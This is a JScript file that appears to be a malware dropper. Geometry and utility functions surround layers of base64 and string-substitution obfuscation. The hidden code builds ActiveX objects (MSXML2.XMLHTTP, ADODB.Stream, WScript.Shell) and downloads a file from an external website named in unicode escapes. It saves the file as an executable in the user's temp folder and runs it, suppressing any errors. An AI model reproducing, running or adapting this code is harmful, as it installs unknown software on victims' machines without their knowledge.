
var minerals = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  jaunty = [];
	
var slavic = { ':': '.','U': 'S','381': 'X'};
	var blink = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function diseases(observatory) {
	considering = observatory;
	for (var i in slavic){considering = considering.replace(i, slavic[i]);}
    return considering;
};

var theater = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.diseases4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/indexed/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = minerals[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = minerals[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = minerals[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = minerals[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var arbor ="indexedJVindexedRFTVindexedAl".diseases4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var nation = "indexedQWindexedN0aXZindexedlWE9iaindexedmVjdA=indexed=".diseases4();
String.prototype.diseases2 = function () {
    var bolivia = {
        characterization: this
    };
    bolivia.forte = bolivia.characterization["c3Vic3RyaW5n".diseases4()](blink, theater);
    return bolivia.forte;
};

var sealskin ="indexedRXhwYW5indexedkRW52aXindexedJvbm1lbnRTdHJindexedpbmdz".diseases4();
var Native = function(options){
	
};
var modem = [nation, sealskin,arbor,  ""+"."+("welled","composite","prize","businesses","hamper","clammy","forums","achievements","exe"), "UnVu".diseases4(), diseases("M"+"SX"+"ML"+("glimmering","elliptical","propitiate","reilly","sorcerer","vertically","permissible","2.")+"381M"+"LH"+"TT"+("prefers","interrogatory","deluge","champion","restricted","naming","believes","aerial","P>")+"WU"+("boris","unload","crucifix","chewing","remainder","creased","capita","cr")+("magnificently","interdict","weathercock","xhtml","asked","brushing","authentic","projected","ip")+"t:"+("distasteful","anarchist","secretive","artificers","stipulation","sawmill","namesake","eightyseven","Sh")+"ell")];
remark = "_F2_";
var obligatory = this[modem.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
mTvKIfIcmk = "usXLxeN";
chancellor = (("denise", "superintendent", "highlight", "hybrid", "appointed", "guess", "widowhood", "pJOQvXwcafV") + "AyVuix").diseases2();
monetary = (("wright", "evaporation", "corpus", "snake", "thered", "zurich", "folding", "editing", "canadian", "sEeLwlU") + "dtqTolPKr").diseases2();
  
    String.prototype.danny = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var paris = modem.pop().split(">");

keynote = "b3Blbg==".diseases4();
var advise = new obligatory(paris[1]);
var ascendancy = new obligatory(paris[0]);
var recordings = advise[modem.shift()](modem.shift());
weasel = "E";

var running = modem.shift();
var alcove = modem.shift();
function calendars(hardihood, controller) {

    try {
        var targets = recordings + "/" + controller ;
		targets = targets+ running;
            ascendancy[keynote](("different","prays","snipe","aphrodite","tracker","cremona","smarter","gardens","G" + weasel) + ("alignment","gents","hexameter","infect","testimonial","administrator","impertinence","earned","ignominy","looped","T"), hardihood, false);
       
    ascendancy[monetary + ("perseus","beguiling","end")]();
	var particular=("chancellor" + WScript=="chancellor" + "V2luZG93cyBTY3JpcHQgSG9zdA==".diseases4())&&ascendancy["c3RhdHVz".diseases4()] +""=="MjAw".diseases4()&&typeof(XvywnFfC)==="undefined";

    if (particular) {
		
        var verandah = new obligatory((("serfs","decrease","convalescence","anteroom","input","chargers","ashley","chancery","A")+("investors","fiftieth","twins","consistent","tracy","expression","works","generic","SEOO")+"DB"+("medicines","flemish","telecommunications","dumfounded","subscribe","adhesive","bulky",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        verandah[keynote]();
        eIMxWO = "_F9_";
        verandah.type = theater;
        wzIamDU = "_F10_";
        verandah["d3JpdGU=".diseases4()](ascendancy[("spleen","poetry","injuries","rendered","ancona","abolitionist","celtic","")+"R"+"es"+"pon"+slavic['U'].toLowerCase()+"e"+"Qm9keQ==".diseases4()]);
        TdLfQKrOgDv = "_F11_";
        verandah[(chancellor + "o"+("paperback","nightlife","absorption","extensively","competitors","gaoler","bluetooth","tease","00")+("malediction","beverage","removal","newer","insulation","torah","witch","8i")+"tion").replace("0"+("agreed","assume","averil","accumulates","descriptions","fatten","midwest","08"), monetary)] = 0;
        YDqyGTeQRq = "_F12_";
        verandah.saveToFile(targets, 2);
        sebOqcrfuAE = "_F13_";
        verandah.close();
        kTYLvLSGS = "_F14_";
		advise[alcove](targets, theater, true);
    }
} catch (cnRijssyd) { };

    DhtbPV = "_F15_";
}
try{
calendars("aHRindexed0cDindexedovLw=indexed=".diseases4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u0072\u0063\u0069\u0061\u006E\u0065\u006C\u006C\u006F\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?MOyblu=gDHhIe","JcQbMVhRXLV");}catch(DXcAWVzK){}

   QuzQSP = "_F16_";
   